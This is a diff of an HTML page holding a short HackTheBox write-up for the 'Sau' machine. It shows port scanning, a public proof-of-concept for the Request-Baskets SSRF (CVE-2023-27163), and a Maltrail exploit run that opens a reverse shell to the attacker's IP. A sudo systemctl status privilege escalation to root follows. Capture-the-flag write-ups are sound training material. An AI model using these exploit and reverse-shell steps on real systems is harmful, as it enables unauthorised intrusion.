@@ -49,56 +49,57 @@
       <div class="wrapper">
         <h1 id="sau">Sau</h1>
 
-<p>HackTheBox: Medium</p>
-
+<p>HackTheBox: Medium
+<br /><br /></p>
 <aside>
 💡 Sau is a medium linux machine which exploit vulnerabilities due to older versions
 
 </aside>
-
+<p><br /><br /></p>
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>Scanning ports</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> 10.129.229.26
-Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-24 21:32 PDT
-Nmap scan report <span class="k">for </span>10.129.229.26
-Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
-Not shown: 65531 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+  <li>Scanning ports
+<br /><br />
+```bash
+$ sudo nmap -n -Pn -p- 10.129.229.26
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 21:32 PDT
+Nmap scan report for 10.129.229.26
+Host is up (0.27s latency).
+Not shown: 65531 closed tcp ports (reset)
 PORT      STATE    SERVICE
 22/tcp    open     ssh
 80/tcp    filtered http
 8338/tcp  filtered unknown
-55555/tcp open     unknown
+55555/tcp open     unknown</li>
+</ul>
 
-Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1388.12 seconds
+<p>Nmap done: 1 IP address (1 host up) scanned in 1388.12 seconds</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+We have a web service at 55555 it allows inspect and depure http requests 
+&lt;br/&gt;&lt;br/&gt;
+It is vulnerable to (CVE-2023-27163) 
+&lt;br/&gt;&lt;br/&gt;
+```bash
+$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+&gt; Creating the "sbqmby" proxy basket...
+&gt; Basket created!
+&gt; Accessing http://10.10.11.234:55555/xsikpk now makes the server request to http://127.0.0.1:80.
+&gt; Authorization: FfWcOUyPi4nGFDSfzSDz_9NrvirREpBzXqJQoiy0-2DqK5NM
 </code></pre></div></div>
-
-<p>We have a web service at 55555 it allows inspect and depure http requests</p>
-
-<p>It is vulnerable to (CVE-2023-27163)</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
-Proof-of-Concept of SSRF on Request-Baskets <span class="o">(</span>CVE-2023-27163<span class="o">)</span> <span class="o">||</span> More info at https://github.com/entr0pie/CVE-2023-27163
-
-<span class="o">&gt;</span> Creating the <span class="s2">"sbqmby"</span> proxy basket...
-<span class="o">&gt;</span> Basket created!
-<span class="o">&gt;</span> Accessing http://10.10.11.234:55555/xsikpk now makes the server request to http://127.0.0.1:80.
-<span class="o">&gt;</span> Authorization: FfWcOUyPi4nGFDSfzSDz_9NrvirREpBzXqJQoiy0-2DqK5NM
-</code></pre></div></div>
-
-<p>That POC make a reques to 80 port and we can get to it</p>
-
+<p><br /><br />
+That POC make a reques to 80 port and we can get to it
+<br /><br /></p>
 <h2 id="2-user-flag">2: User flag</h2>
-
-<p><img src="/assets/images/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c_Untitled.png" alt="Untitled" /></p>
-
-<p>We find a Maltrail service running with an unprotected version</p>
-
-<p>We find another POC</p>
-
+<p><br /><br />
+<img src="/assets/images/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c_Untitled.png" alt="Untitled" />
+<br /><br />
+We find a Maltrail service running with an unprotected version
+<br /><br />
+We find another POC 
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py 10.10.14.246 4444 http://10.10.11.234:55555/sbqmby
 Running exploit on http://10.10.11.234:55555/sbqmby
 </code></pre></div></div>
@@ -110,11 +111,11 @@ connect to <span class="o">[</span>10.10.14.246] from <span class="o">(</span>UN
 whoami
 </span>puma
 </code></pre></div></div>
-
+<p><br /><br /></p>
 <h2 id="3-priv-esc">3: Priv esc</h2>
-
-<p>Check for privileges</p>
-
+<p><br /><br />
+Check for privileges
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
 <span class="nb">sudo</span> <span class="nt">-l</span>
 Matching Defaults entries <span class="k">for </span>puma on sau:
@@ -124,9 +125,9 @@ Matching Defaults entries <span class="k">for </span>puma on sau:
 User puma may run the following commands on sau:
     <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
 </code></pre></div></div>
-
-<p>It appears that we are able to examine the trail.service’s status.</p>
-
+<p><br /><br />
+It appears that we are able to examine the trail.service’s status.
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/systemctl status
 
 <span class="k">while </span>it load
@@ -136,8 +137,10 @@ User puma may run the following commands on sau:
 We are root
 
 </code></pre></div></div>
+<p><br /><br />
+<script src="/assets/js/matrix-overlay.js"></script></p>
 
-<script src="/assets/js/matrix-overlay.js"></script>
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
 
 
